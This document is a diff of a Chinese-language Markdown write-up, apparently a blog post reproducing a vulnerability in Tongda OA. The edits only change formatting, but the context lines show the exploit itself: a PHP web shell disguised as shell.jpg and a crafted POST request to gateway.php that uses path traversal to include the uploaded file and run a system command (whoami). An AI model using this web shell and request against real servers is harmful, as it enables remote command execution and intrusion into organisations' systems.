@@ -82,7 +82,7 @@ V11 版、2017 版、2016 版、2015 版、2013 增强版、2013 版
 
 ①将以下内容保存为 html：
 
-[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")
+`[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")`
 
 ```
 <html>
@@ -98,13 +98,13 @@ V11 版、2017 版、2016 版、2015 版、2013 增强版、2013 版
 </html>
 ```
 
-[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")
+`[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")`
 
  
 
 **②将以下内容保存为 shell.jpg:**
 
-[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")
+`[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")`
 
 ```
 <?php
@@ -117,7 +117,7 @@ echo $stroutput;
 ?>
 ```
 
-[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")
+`[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")`
 
  
 
@@ -143,7 +143,7 @@ echo $stroutput;
 
 **访问漏洞页面，并且把 GET 改成 POST，并修改、构造数据包，注意 Content-Type 是要手动加上的：**
 
-[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")
+`[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")`
 
 ```http
 POST /ispirit/interface/gateway.php HTTP/1.1
@@ -163,7 +163,7 @@ json={"url":"/general/../../attach/im/2006/209898972.shell.jpg"}&cmd=whoami
 
 > 请求长度说明：原资料 Content-Length 为 77；保留原始标头；其数值未据实际请求体重新计算或验证。
 
-[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")
+`[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")`
 
 
 
